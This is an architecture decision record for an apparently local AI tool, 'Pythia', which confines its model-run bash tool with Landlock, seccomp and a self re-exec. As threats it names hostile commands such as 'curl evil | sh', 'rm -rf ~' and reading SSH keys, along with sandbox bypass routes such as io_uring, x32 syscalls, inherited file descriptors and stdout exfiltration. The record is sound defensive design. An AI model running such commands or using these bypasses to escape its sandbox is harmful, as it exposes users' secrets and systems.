# 0005 — Bash tool OS sandbox: Landlock + seccomp via self re-exec

**Status:** Accepted

## Context

The `bash` built-in tool (`internal/adapter/tool/bash`) runs model-chosen shell
commands with no OS-level isolation — only a working directory, a timeout, a
bounded buffer, and full parent env passthrough. Because the model picks the
command from untrusted context (prompt, prior tool output, files it read), this
is a live RCE surface: a command can read `~/.ssh/id_rsa`, `rm -rf ~`, `curl
evil | sh`, reach `docker.sock`, or `ptrace` another process. The approved spec
(`docs/superpowers/specs/bash-sandbox.md`) and the adversarial threat pass
(`docs/security/bash-sandbox-threat-model.md`, SR-3a.1–.14, H1–H3) close this at
the existing `core.Tool` seam. This ADR records the load-bearing mechanism and
application decisions; the two source documents own the full bypass analysis.

The overriding constraint carried from the first slice (ADR-0003/0004-adjacent)
is **a single, portable, CGO-free static binary** (`CGO_ENABLED=0`). Every
mechanism choice is decided against it.

**Isolation mechanism.**

| Option | Strengths | Weaknesses | When to prefer |
|--------|-----------|------------|----------------|
| **Landlock (`landlock-lsm/go-landlock`) + seccomp-bpf (`elastic/go-seccomp-bpf`), both pure Go** (chosen) | Pure Go over `x/sys/unix` → preserves the CGO-free static binary; kernel-enforced FS + syscall (incl. network) confinement; no external runtime or root; applied in-process | Linux-only; needs kernel 5.13+/Landlock ABI ≥ 2; allowlist curation is real work | An in-process, single-binary sandbox for a local tool — our exact case |
| **`libseccomp-golang`** | Canonical libseccomp API | **CGO** → breaks `CGO_ENABLED=0`, forfeits the static binary | When CGO is already accepted |
| **network/mount/user namespaces + `unshare`** | No LSM dependency; strong isolation | Heavier; needs the unprivileged-userns dance (often disabled); still requires a re-exec, so it adds weight without removing the hard part | When Landlock is unavailable and userns is guaranteed |
| **Container / gVisor / nsjail runtime** | Strongest, battle-tested isolation | External dependency, not a single static binary, real ops weight; contradicts the ship-as-one-binary NFR | Multi-tenant/hostile workloads with an ops platform |

**Syscall policy: allowlist vs denylist.** The pivotal call. A denylist is
**structurally unsound** here and cannot be made complete: syscall multiplexers
(`socketcall`, and io_uring, which submits `SOCKET`/`CONNECT`/`OPENAT` as ring
ops that never reach the syscall layer) route around any number-keyed rule;
memory-poke syscalls (`process_vm_readv/writev`, `kcmp`, `userfaultfd`) each
have to be remembered separately; the **x32 ABI** (`nr | 0x40000000`) and i386
numbering bypass a filter that ignores `seccomp_data.arch`; and **every future
kernel syscall** is a new hole until someone adds it. An allowlist denies all of
these *by default* and fails safe — io_uring, socketcall, and tomorrow's syscall
are closed for free. The cost (curating the allowed set from go-seccomp-bpf's
profiles minus sockets and the lethal set) is one-time.

**Application mechanism.** Landlock rulesets and seccomp filters apply to the
calling thread and are inherited across `execve`; they must be installed in the
child *before* it becomes `bash`, never in the parent (or Pythia sandboxes
itself). Go has no safe post-fork/pre-exec hook, so the idiomatic pattern is
**self re-exec**: the parent re-invokes the Pythia image with a reserved
subcommand, and that child installs the sandbox and `execve`s into bash.

## Decision

**1. Mechanism — Landlock (filesystem) + seccomp-bpf (syscalls incl. network),
both pure Go.** `landlock-lsm/go-landlock` for the write-scope policy;
`elastic/go-seccomp-bpf` for the syscall filter. `libseccomp-golang` (CGO),
namespaces+`unshare`, and container/gVisor/nsjail runtimes are **rejected** for
the reasons tabled above — each either breaks the CGO-free static binary or
adds an external dependency / ops weight the single-binary NFR forbids.

**2. seccomp is an allowlist (default-deny), not a denylist** — the only design
that fails safe against io_uring, `socketcall`, `process_vm_*`, x32/foreign-arch,
and future syscalls (per threat model §2.3, §3.3, SR-3a.1).

**3. Applied via self re-exec from `/proc/self/exe`** with a reserved
`__bash-sandbox` subcommand. The child sets `NO_NEW_PRIVS`, scrubs env, installs
Landlock then seccomp on a locked OS thread, and `syscall.Exec`s `/bin/bash`;
both controls persist across the execve and into bash. Re-exec is from
`/proc/self/exe` (not `os.Args[0]`, which a writable-scope binary swap could
subvert). This requires a **cross-cutting subcommand hook in
`cmd/pythia/main.go`**: `main` detects the reserved arg **before** loading config
or starting the TUI, dispatches to a thin entrypoint exported by the bash
adapter, and never returns to the TUI path. No sandbox logic lives in `main`.

**4. Settled parameters** (decided; cite threat model §3, §5):
- seccomp default action is **per-syscall**: `ENOSYS` for the unknown long tail
  (libc feature-probes degrade gracefully), `EACCES`/`EAFNOSUPPORT` for sockets
  (so `curl`/`git` fail cleanly and the model stops retrying), and
  `KILL_PROCESS` for the lethal set (`ptrace`, `process_vm_*`, `mount`,
  `pivot_root`, `kexec`, module/key/`bpf`/io_uring/`userfaultfd`/`unshare`/
  reboot/swap) and any **foreign-arch / x32** attempt (SR-3a.4, .14).
- **`socket()` denied for all address families** — AF_UNIX reaches host daemons
  (`docker.sock` = host takeover), AF_NETLINK leaks; denying only AF_INET/6 is
  insufficient. io_uring blocked (free under the allowlist) (SR-3a.2, .3).
- **Landlock strict min-ABI ≥ 2, fail-closed** — ABI 2 (`REFER`) closes the
  hardlink/rename escape; no best-effort degrade (SR-3a.8, §3.2).
- **`NO_NEW_PRIVS`** set before Landlock/seccomp (required by both; also
  neutralises setuid escalation) (SR-3a.6).
- **All parent fds close-on-exec** — an inherited connected socket defeats
  network denial (`sendmsg` needs no `socket()`), an inherited writable fd
  defeats Landlock (checked at open time) (SR-3a.7).
- **Fixed `PATH` constant** (`/usr/bin:/bin`, never inherited) and bash by
  **absolute `/bin/bash`** — a prior command must not poison binary resolution
  (SR-3a.12).
- Command + resolved policy delivered to the child over a **length-prefixed
  pipe**, never argv/env — the attacker controls command bytes incl.
  newline/NUL, so delimiter framing could desync (SR-3a.13).
- **Session DB and binary relocated outside the writable scope** — with defaults
  `./pythia.db` and the binary can sit inside the workspace; a command could
  tamper history or overwrite the re-exec target (SR-3a.13).

**5. Fail-closed posture.** Default ON. If Landlock/seccomp are absent, the
kernel is pre-5.13 / ABI < 2, or the platform is non-Linux, `Invoke` returns an
error envelope and does **not** run the command. Build-tagged split:
`sandbox_linux.go` (real controls) + a non-Linux stub that refuses. The single,
explicit override is `PYTHIA_BASH_SANDBOX=off` (parent env only, read via
`internal/config`, for debugging; emits a one-time explicit unsandboxed log).
Nothing in the model's tool args can flip it (SR-5 preserved); the
`__bash-sandbox` child has no off-branch and applies the sandbox unconditionally.

All sandbox logic stays inside `internal/adapter/tool/bash`; `internal/core`
remains stdlib-only.

## Consequences

- **Easier:** the RCE surface is closed at the existing `core.Tool` seam — no
  core change, no new port; the tool's `output` envelope
  (stdout/stderr/exit/timeout/truncation) is unchanged, so the turn loop and TUI
  are untouched.
- **Easier:** the allowlist gets io_uring, `socketcall`, `process_vm_*`, x32,
  and every future syscall right *for free* — the sandbox does not rot as the
  kernel grows a new dangerous syscall.
- **Easier:** each control is a testable invariant — the threat model's SR-3a.x
  bypass probes (AF_UNIX/io_uring/x32/inherited-fd/hardlink/PATH-poison) become
  Linux-gated integration tests.
- **Harder:** enforcement is **Linux-only** and requires **kernel 5.13+ /
  Landlock ABI ≥ 2**; older kernels and non-Linux hosts fail closed (must use
  the debug escape hatch). Accepted for a Linux-first local tool.
- **Harder:** the adapter gains dependencies on `x/sys/unix`, `go-landlock`, and
  `go-seccomp-bpf`, and `cmd/pythia/main.go` gains a reserved-subcommand branch.
  The `internal/arch` dependency-rule fitness guard still holds — the deps live
  in the adapter and `main`; **core stays stdlib-only** and the guard runs
  unchanged.
- **Obligation:** curating and maintaining the seccomp allowlist (must include
  `execve`/`execveat` and the syscalls `syscall.Exec` issues before the filter's
  final step, or the exec into bash fails) is ongoing adapter work.
- **Residual (load-bearing):** the sandbox cannot close the **stdout egress
  channel** — a command can `cat` a secret and return it through tool output;
  network denial does not touch this path. This is acceptable **only because the
  provider (Ollama) is local** (SR-3a.H2). That assumption is load-bearing:
  adding a remote/hosted provider, telemetry, or log-shipping reopens it and
  forces a read-denylist or output-scrubbing revisit. DoS (fork bomb / disk /
  memory) remains bounded only by the timeout + output cap; rlimits are deferred
  to SR-3a.H1.
